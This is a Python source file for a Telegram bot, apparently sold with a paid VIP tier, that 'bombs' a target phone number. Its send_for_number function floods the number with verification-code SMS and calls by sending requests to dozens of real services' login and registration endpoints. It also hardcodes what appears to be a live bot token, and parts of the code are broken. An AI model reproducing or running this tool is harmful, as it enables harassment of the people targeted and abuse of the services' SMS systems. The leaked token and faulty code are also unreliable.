# -*- coding: utf-8 -*-
import colorama
from colorama import Fore, Back, Style
import requests
from telebot import TeleBot
from threading import Thread
import telebot
import random, datetime, time
from telebot import types
from time import time
from fake_useragent import UserAgent
import re
import os
from threading import Timer
import time
from datetime import datetime, timedelta
from SimpleQIWI import *
ua = UserAgent(verify_ssl=False)
########## Настройки бота ###########
owner_id = 1820575447               # Айди владельца бомбера
logs_ch = '521147573'          # Айди чата для логов        
bot_username = 'ParatovBomber_bot'       # Юзернейм бота без @
TOKEN = '1922563846:AAFmxxa4-UuSit62xhAln9tXiwOvwCmq41Q' # Токен бота
######### Настройки платежей ########
vip_price = 100                      # Цена за VIP
qiwi_nick = 'ABLAB236'              # Ник киви для приёма оплаты
######### Прочие настройки ##########
messages_in_minute = 30             # Кол-во сообщений в минуту для включения анти-спама
#####################################
banner = """
💣 
# os.system("clear")
bot = TOKEN
user_dict = {'user_id': ['number_mess', 'time', 'spam']}
def AntiSpam(message):
    global user_dict
    global messages_in_minute
    if user_dict.get(message.from_user.id) == None:
        key = message.from_user.id
        user_dict.update({key: [0, 0, False]})
    if user_dict.get(message.from_user.id)[0] > messages_in_minute:
        if user_dict.get(message.from_user.id)[1] == time.strftime('%M') and user_dict.get(message.from_user.id)[2] != True:
            key = message.from_user.id
            value = user_dict.get(message.from_user.id)
            value[2] = True
            user_dict.update({key: value})
            print(f'[@'+str(bot_username)+'] Обнаружен спам от '+str(message.from_user.username)+' - '+str(message.from_user.id))
            bot.send_message(logs_ch, f'[@'+str(bot_username)+']\nОбнаружен спам от '+str(message.from_user.username)+' - '+str(message.from_user.id))
            bot.send_message(message.chat.id, f'<b>Спам ограничение включено</b>\nНе более '+str(messages_in_minute)+' сообщений в минуту', parse_mode = 'html')
        elif user_dict.get(message.from_user.id)[1] != time.strftime('%M'):
            key = message.from_user.id
            value = user_dict.get(message.from_user.id)
            value[0] = 0
            value[2] = False
            key = message.from_user.id
            user_dict.update({key: value})
            bot.send_message(message.chat.id, '<b>Спам ограничение снято</b>', parse_mode = 'html')
    elif user_dict.get(message.from_user.id)[0] <= messages_in_minute:
        if user_dict.get(message.from_user.id)[1] != time.strftime('%M'):
            value = user_dict.get(message.from_user.id)
            value[0] = 0
            key = message.from_user.id
            user_dict.update({key: value})
        value = user_dict.get(message.from_user.id)
        value[0] += 1
        value[1]  = time.strftime('%M')
        key = message.from_user.id
        user_dict.update({key: value})
        return True
THREADS_LIMIT = 100000
wl_file = 'numWL.txt'
chat_ids_file = 'users_free.txt'
vip_id_file = 'vip_id.txt'
users_amount = [0]
threads = list()
THREADS_AMOUNT = [0]
types = telebot.types
bot = TeleBot(TOKEN)
running_spams_per_chat_id = []
numbers = [0]
vipsus = [0]
nums = 'numbers.txt'
# bot.send_message(logs_ch, f'[@'+str(bot_username)+']\nЗапуск бота прошёл по плану.')

def save_vip_id(chat_id):
    "Функция добавляет чат айди в файл если его там нету"
    chat_id = str(chat_id)
    
    with open('vip_id.txt',"a+") as _vipsus:
        _vipsus.seek(0)

        vip_list = [line.split('\n')[0] for line in _vipsus]

        if chat_id not in vip_list:
            _vipsus.write(f'{chat_id}\n')
            vip_list.append(chat_id)
            print(f'[@'+str(bot_username)+']  Новый VIP '+str(chat_id)+' сохранён')
        else:
            print(f'[@'+str(bot_username)+']  Новый VIP '+str(chat_id)+' сохранён')
        vipsus[0] = len(vip_list)
    return    

def save_chat_id(chat_id):
    chat_id = str(chat_id)
    with open(chat_ids_file,"a+") as ids_file:
        ids_file.seek(0)

        ids_list = [line.split('\n')[0] for line in ids_file]

        if chat_id not in ids_list:
            ids_file.write(f'{chat_id}\n')
            ids_list.append(chat_id)
        else:
            pass
        users_amount[0] = len(ids_list)
    return

def save_numlog(num):
    num = str(num)
    with open(nums,"a+") as num_list:
        num_list.seek(0)

        numss = [line.split('\n')[0] for line in nums]

        if num not in numss:
            num_list.write(f'{num}\n')
            numss.append(num)
            print(f'[@'+str(bot_username)+'] Номер '+str(num)+' добавлен')
        else:
            num_list.write(f'{num}\n')
            numss.append(num)
            print(f'[@'+str(bot_username)+'] Номер '+str(num)+' добавлен')
        numbers[0] = len(numss)
    return

def addwl(message):
    try:
        if str(message.text) in open('numWL.txt').read():
            bot.send_message(message.chat.id, f"Этот номер уже есть в белом листе")
        else:
            f = open('numWL.txt', 'a')
            f.write(str(message.text) + '\n')
            bot.send_message(message.chat.id, f"Номер был успешно добавлен в белый лист")
            print(f'[@'+str(bot_username)+'] '+str(message.chat.id)+' добавил номер '+str(message.text)+' в белый лист')
            bot.send_message(logs_ch, f'[@'+str(bot_username)+']\n '+str(message.chat.id)+' добавил номер '+str(message.text)+' в белый лист')
    except:
        bot.send_message(message.chat.id, "Ошибка! Вы ввели не номер!")
def delllwl(message):
    with open("numWL.txt", "r") as f:
        lines = f.readlines()
    with open("numWL.txt", "w") as f:
        for line in lines:
            if line.strip("\n") != message.text:
                f.write(line)
    bot.send_message(message.chat.id, f"Пользователь "+str(message.text)+" - успешно удален из базы")

def send(url,data,headers):
    try:
        print(requests.post(url,data=data,headers=headers))
    except:
        print("<Request Error>")

def user(id):
    f = open(vip_id_file,'r')
    if str(id) in f.read():
        return "1"
    else:
        pass

def delluser(message):
    with open("vip_id.txt", "r") as f:
        lines = f.readlines()
    with open("vip_id.txt", "w") as f:
        for line in lines:
            if line.strip("\n") != message.text:
                f.write(line)
    bot.send_message(message.chat.id, f"Пользователь "+str(message.text)+" - успешно удален из базы")
    bot.send_message(logs_ch, f'[@'+str(bot_username)+']\nУ пользователя '+str(message.text)+' отобран VIP-статус')
    bot.send_message(message.text, f"Доступ к VIP Меню для Вас ограничен.")

def adduser(message):
    try:
        if str(message.text) in open('vip_id.txt').read():
            bot.send_message(message.chat.id, f"Пользователь "+str(message.text)+" - уже есть в базе")

        else:
            f = open('vip_id.txt', 'a')
            f.write(str(message.text) + '\n')
            bot.send_message(message.chat.id, f"Пользователь "+str(message.text)+" - успешно добавлен в базу")
            print(f'[@'+str(bot_username)+'] '+str(message.text)+' добавлен в VIP пользователи')
            bot.send_message(logs_ch, f'[@'+str(bot_username)+']\n'+str(message.text)+' добавлен в VIP пользователи')
            bot.send_message(message.text, f"Спасибо за покупку, напишите /start\n\n<b>Удачного пользования.", parse_mode='HTML')
    except:
        pass

def send_message_users(msg):
    with open("users_free.txt", "r") as file:
        for el in file:
            try:
                response = requests.post(f'https://api.telegram.org/bot{TOKEN}/sendMessage', data={'chat_id':el.rstrip('\n'),'text':msg})
                time.sleep(0.2)
            except:
                print('[@'+str(bot_username)+'] Не получилось отправить сообщение! Ошибка с отправкой сообщения:' + el.rstrip('\n') )

    bot.send_message(logs_ch, f'[@'+str(bot_username)+']\nРассылка разослана успешно.')

def generator(string):
    for word in string:
        id = word.replace('\n','')
        yield id


@bot.message_handler(commands=["start"])
def start(message):
    if AntiSpam(message) == True:
        if message.chat.type == "private":
                
            user_id = str(message.chat.id)
            find = False
            with open('bl.txt','rt',errors='ignore') as ids:
                for id in generator(ids):
                    if id.strip() == user_id:
                        find = True
                        break
                    else:
                        continue

            if find:
                bot.send_message(message.chat.id, 'Вы добавлены в чёрный список бота.')
            else:
                save_chat_id(message.chat.id)
                global keyboard
                keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True)
                free_bomber = types.KeyboardButton(text='📲 Бомбер')
                info = types.KeyboardButton(text='🖥 Информация')
                vip = types.KeyboardButton(text='❗️VIP')
                admin = types.KeyboardButton(text='Админ меню')

                if str(message.chat.id) in open('admin.txt').read():
                    keyboard.add(free_bomber, vip)
                    keyboard.add(info)
                    keyboard.add(admin)
                else:
                    keyboard.add(free_bomber, vip)
                    keyboard.add(info)

            #    some_var = bot.get_chat_member(-1001111111, message.chat.id)
            #    user_status = some_var.status

            #    global inl_keyboard
            #    inl_keyboard = types.InlineKeyboardMarkup()
            #    s = types.InlineKeyboardButton(text = 'Подписаться', url = 'https://t.me/ParatovBomber')
            #    inl_keyboard.add(s)

            #    if user_status == 'member' or user_status == 'administrator' or user_status =='creator':
                bot.send_message(message.chat.id, '🔝 Вы находитесь в главном меню',  reply_markup=keyboard )
                save_chat_id(message.chat.id)
                
            #    if user_status == 'restricted' or user_status =='left' or user_status =='kicked':
            #        bot.send_message(message.chat.id, 'Вы не подписаны на наш канал.\nПодпишитесь на него чтобы получить доступ к боту.', reply_markup = inl_keyboard)

price = vip_price
def donat(chat_id, user):
    price = vip_price
  nickusr = qiwi_nick
    info = QApi(nickusr).payments
    i = 0
    for el in info['data']:
        clow = el['comment']
        slow = el['sum']['amount']
        print('[@'+str(bot_username)+'] Платёж ', slow, '₽ с комментарием "',clow, '"')
        if clow == chat_id and slow >= price:
            save_vip_id(chat_id)
            bot.send_message(chat_id, '✅ Платёж найден!')
            bot.send_message(logs_ch, f'✅ <code>'+str(chat_id)+'</code> оплатил подписку за <code>'+str(price)+'</code> руб.', parse_mode='HTML')
            break
        i = i + 1
        if i >= 4:
            break
        else:
            bot.send_message(chat_id, f'🛑 [Попытка {i}] Платёж не найден.')
            time.sleep(5)

iteration = 0
_name = ''
for x in range(12):
    _name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
    password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
    username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))


def send_for_number(phone):
        request_timeout = 0.00001
        _email = _name+f'{iteration}'+'@gmail.com'
        email = _name+f'{iteration}'+'@gmail.com'
        _phone='380506691610'
        _phoneNEW=phone[3:]
        _phone = phone
        _phone9 = _phone[1:]
        _phoneAresBank = '+'+_phone[0]+'('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11] #+7+(915)350-99-08
        _phone9dostavista = _phone9[:3]+'+'+_phone9[3:6]+'-'+_phone9[6:8]+'-'+_phone9[8:10] #915+350-99-08
        _phoneOstin = '+'+_phone[0]+'+('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11] # '+7+(915)350-99-08'
        _phonePizzahut = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+' '+_phone[7:9]+' '+_phone[9:11] # '+7 (915) 350 99 08'
        _phoneGorzdrav = _phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11] # '915) 350-99-08'
        _phonePozichka = '+'+_phone[0:2]+'-'+_phone[2:5]+'-'+_phone[5:8]+'-'+_phone[8:10]+'-'+_phone[10:12] #38-050-669-16-10'
        _phoneQ = '+'+_phone[0:2]+'('+_phone[2:5]+') '+_phone[5:8]+' '+_phone[8:10]+' '+_phone[10:12] # +38(050) 669 16 10
        _phoneCitrus = '+'+_phone[0:3]+' '+_phone[3:5]+'-'+_phone[5:8]+' '+_phone[8:10]+' '+_phone[10:12]
        _phoneComfy = '+'+_phone[0:2]+' ('+_phone[2:5]+') '+_phone[5:8]+'-'+_phone[8:10]+'-'+_phone[10:12]
        _phone88 = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+' '+_phone[7:9]+'-'+_phone[9:11]
        _phone585 = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11] #+7 (925) 350-99-08

        standar_headers = {'User-Agent': ua.chrome}
        
        
        
        
        
           
        try:
            requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': _phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
            print('[@'+str(bot_username)+'] [+] Grab отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post('https://api.chef.yandex/api/v2/auth/sms', json={"phone": _phone})
            print('[@'+str(bot_username)+'] [+] chef отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!') 
            
        try:
            requests.post('https://lenta.com/api/v1/authentication/requestValidationCode', json={'phone': '+' + _phone})
            print('[@'+str(bot_username)+'] [+] lenta отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!') 
          
        try:
            requests.post('https://dostavista.ru/backend/send-verification-sms', data={"phone": _phone})
            print('[@'+str(bot_username)+'] [+] dos отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!') 
            
        try:
            requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
            print('[@'+str(bot_username)+'] [+] RuTaxi отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={})
            print('[@'+str(bot_username)+'] [+] BelkaCar отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')
        
        try:
            requests.post('https://secure.online.ua/ajax/check_phone/', params={"reg_phone": _phone})
            print('[@'+str(bot_username)+'] [+] secure отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')
            
        try:
            requests.post('https://cabinet.planetakino.ua/service/sms', params={"phone": _phone})
            print('[@'+str(bot_username)+'] [+] planetakino отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')    
            
        try:
            requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": _phone})
            print('[@'+str(bot_username)+'] [+] pmsm отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post('https://api.ivi.ru/mobileapi/user/register/phone/v6', data={"phone": _phone})
            print('[@'+str(bot_username)+'] [+] ivi отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')        
            
            
            
            
        try:
            requests.get('https://www.finam.ru/api/smslocker/sendcode', data={"phone": "+" + _phone})
            print('[@'+str(bot_username)+'] [+] finam отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')
        
        try:
            requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
            print('[@'+str(bot_username)+'] [+] mtstv отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')
            
        try:
            requests.post('https://account.my.games/signup_send_sms/', data={"phone": _phone})
            print('[@'+str(bot_username)+'] [+] games отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')   
            
        try:
            requests.post('https://kasta.ua/api/v2/login/', data={"phone":_phone})
            print('[@'+str(bot_username)+'] [+] kasta отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')      
            
        try:
            requests.post('https://taxi-ritm.ru/ajax/ppp/ppp_back_call.php?URL=/', data={"RECALL": "Y", "BACK_CALL_PHONE": _phone})
            print('[@'+str(bot_username)+'] [+] ritm отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')
            
        try:
            requests.post('https://city24.ua/personalaccount/account/registration', data={"PhoneNumber": _phone})
            print('[@'+str(bot_username)+'] [+] city24 отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')    
            
        try:
            requests.post('https://client-api.sushi-master.ru/api/v1/auth/init', json={"phone": _phone})
            print('[@'+str(bot_username)+'] [+] sushi-master отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')
            
        try:
            requests.post('https://auth.multiplex.ua/login', json={"login": _phone})
            print('[@'+str(bot_username)+'] [+] plex отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')    

        try:
            requests.post('https://shop.vsk.ru/ajax/auth/postSms/', data={"phone": _phone})
            print('[@'+str(bot_username)+'] [+] vsk отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')
            
            
            
            
        try:
            requests.get('https://www.sportmaster.ua/?module=users&action=SendSMSReg&phone=+38%20(050)%20326-87-32', data={"phone": _phone})
            print('[@'+str(bot_username)+'] [+] sportmaster отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')
            
        try:
            requests.post('https://koronapay.com/transfers/online/api/users/otps', data={"phone": _phone})
            print('[@'+str(bot_username)+'] [+] korona отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')
        
        try:
            requests.post('https://btfair.site/api/user/phone/code', json={"phone": "+" + _phone,})
            print('[@'+str(bot_username)+'] [+] btfair отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')
            
        try:
            requests.post('https://thehive.pro/auth/signup', json={"phone": "+" + _phone,})
            print('[@'+str(bot_username)+'] [+] thehive отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')
        
        try:
            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone}, headers={})
            print('[@'+str(bot_username)+'] [+] Tinder отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone}, headers={})
            print('[@'+str(bot_username)+'] [+] Karusel отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+'+_phone}, headers={})
            print('[@'+str(bot_username)+'] [+] Tinkoff отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
            print('[@'+str(bot_username)+'] [+] MTS отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
            print('[@'+str(bot_username)+'] [+] Youla отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post('https://pizzahut.ru/account/password-reset', data={'reset_by':'phone', 'action_id':'pass-recovery', 'phone': _phonePizzahut, '_token':'*'})
            print('[@'+str(bot_username)+'] [+] PizzaHut отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post('https://www.rabota.ru/remind', data={'credential': _phone})
            print('[@'+str(bot_username)+'] [+] Rabota отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+'+_phone})
            print('[@'+str(bot_username)+'] [+] Rutube отправлено!')
        except:
            requests.post('https://www.citilink.ru/registration/confirm/phone/+'+_phone+'/')
            print('[@'+str(bot_username)+'] [+] Citilink отправлено!')

        try:
            requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php', data={'name': _name,'phone': _phone, 'promo': 'yellowforma'})
            print('[@'+str(bot_username)+'] [+] Smsint отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.get('https://www.oyorooms.com/api/pwa/generateotp?phone='+_phone9+'&country_code=%2B7&nod=4&locale=en')
            print('[@'+str(bot_username)+'] [+] oyorooms отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCodeForOtp', params={'pageName': 'loginByUserPhoneVerification', 'fromCheckout': 'false','fromRegisterPage': 'true','snLogin': '','bpg': '','snProviderId': ''}, data={'phone': _phone,'g-recaptcha-response': '','recaptcha': 'on'})
            print('[@'+str(bot_username)+'] [+] MVideo отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {'client': {'firstName': 'Иван', 'lastName': 'Иванов', 'phone': _phone,'typeKeys': ['Unemployed']}},'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
            print('[@'+str(bot_username)+'] [+] newnext отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
            print('[@'+str(bot_username)+'] [+] Sunlight отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/', json={'client_type': 'personal', 'email': _email, 'mobile_phone': _phone, 'deliveryOption': 'sms'})
            print('[@'+str(bot_username)+'] [+] alpari отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
            print('[@'+str(bot_username)+'] [+] Invitro отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post('https://online.sbis.ru/reg/service/', json={'jsonrpc':'2.0','protocol':'5','method':'Пользователь.ЗаявкаНаФизика','params':{'phone':_phone},'id':'1'})
            print('[@'+str(bot_username)+'] [+] Sberbank отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest', json={'firstName':'Иван','middleName':'Иванович','lastName':'Иванов','sex':'1','birthDate':'10.10.2000','mobilePhone': _phone9,'russianFederationResident':'true','isDSA':'false','personalDataProcessingAgreement':'true','bKIRequestAgreement':'null','promotionAgreement':'true'})
            print('[@'+str(bot_username)+'] [+] Psbank отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
            print('[@'+str(bot_username)+'] [+] Beltelcom отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone})
            print('[@'+str(bot_username)+'] [+] Karusel отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')
            
        try:
            requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
            print('[@'+str(bot_username)+'] [+] KFC отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post("https://api.carsmile.com/",json={"operationName": "enterPhone", "variables": {"phone": _phone},"query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n"})
            print('[@'+str(bot_username)+'] [+] carsmile отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
            print('[@'+str(bot_username)+'] [+] Citilink отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post("https://api.delitime.ru/api/v2/signup",data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3})
            print('[@'+str(bot_username)+'] [+] Delitime отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
            print('[@'+str(bot_username)+'] [+] findclone звонок отправлен!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru','version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
            print('[@'+str(bot_username)+'] [+] ICQ отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",data={"mode": "request", "phone": "+" + _phone,"phone_permission": "unknown", "stream_id": 0, "v": 3, "appversion": "3.20.6","osversion": "unknown", "devicemodel": "unknown"})
            print('[@'+str(bot_username)+'] [+] InDriver отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword", data={"password": password, "application": "lkp", "login": "+" + _phone})
            print('[@'+str(bot_username)+'] [+] Invitro отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate',json={"phone": _phone})
            print('[@'+str(bot_username)+'] [+] Pmsm отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6",data={"phone": _phone})
            print('[@'+str(bot_username)+'] [+] IVI отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post('https://cloud.mail.ru/api/v2/notify/applink',json={"phone": "+" + _phone, "api": 2, "email": "email","x-email": "x-email"})
            print('[@'+str(bot_username)+'] [+] Mail.ru отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',params={"pageName": "registerPrivateUserPhoneVerificatio"},data={"phone": _phone, "recaptcha": 'off', "g-recaptcha-response": ""})
            print('[@'+str(bot_username)+'] [+] MVideo отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",data={"st.r.phone": "+" + _phone})
            print('[@'+str(bot_username)+'] [+] OK отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post('https://plink.tech/register/',json={"phone": _phone})
            print('[@'+str(bot_username)+'] [+] Plink отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",json={"phone": _phone})
            print('[@'+str(bot_username)+'] [+] qlean отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post("http://smsgorod.ru/sendsms.php",data={"number": _phone})
            print('[@'+str(bot_username)+'] [+] SMSgorod отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',data={'phone_number': _phone})
            print('[@'+str(bot_username)+'] [+] Tinder отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post('https://passport.twitch.tv/register?trusted_request=true',json={"birthday": {"day": 11, "month": 11, "year": 1999},"client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,"password": password, "phone_number": _phone,"username": username})
            print('[@'+str(bot_username)+'] [+] Twitch отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': _phone},headers={'App-ID': 'cabinet'})
            print('[@'+str(bot_username)+'] [+] CabWiFi отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post("https://api.wowworks.ru/v2/site/send-code",json={"phone": _phone, "type": 2})
            print('[@'+str(bot_username)+'] [+] wowworks отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post('https://eda.yandex/api/v1/user/request_authentication_code',json={"phone_number": "+" + _phone})
            print('[@'+str(bot_username)+'] [+] Eda.Yandex отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
            print('[@'+str(bot_username)+'] [+] Youla отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',json={"client_type": "personal", "email": f"{email}@gmail.ru","mobile_phone": _phone, "deliveryOption": "sms"})
            print('[@'+str(bot_username)+'] [+] Alpari отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",data={"phone": _phone})
            print('[@'+str(bot_username)+'] [+] SMS отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": _phone})
            print('[@'+str(bot_username)+'] [+] Delivery отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')
            
        

        try:
            requests.post("https://taxi-ritm.ru/ajax/ppp/ppp_back_call.php?URL=/",
            data={"RECALL": "Y", "BACK_CALL_PHONE": _phone},headers=standar_headers,proxies=proxies)
            print('[@'+str(bot_username)+'] [+]ritm отправлено')
        except:
            pass
        
        try:
            requests.post("https://www.flipkart.com/api/5/user/otp/generate",
            headers={
                "Origin": "https://www.flipkart.com",
                "X-user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0 FKUA/website/41/website/Desktop",
            },
            data={"loginId": "+" + _phone})
            print('[@'+str(bot_username)+'] [+] FlipKart отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post("https://www.flipkart.com/api/6/user/signup/status",
            headers={
                "Origin": "https://www.flipkart.com",
                "X-user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0 FKUA/website/41/website/Desktop",
            },
            json={"loginId": "+" + _phone, "supportAllStates": True})
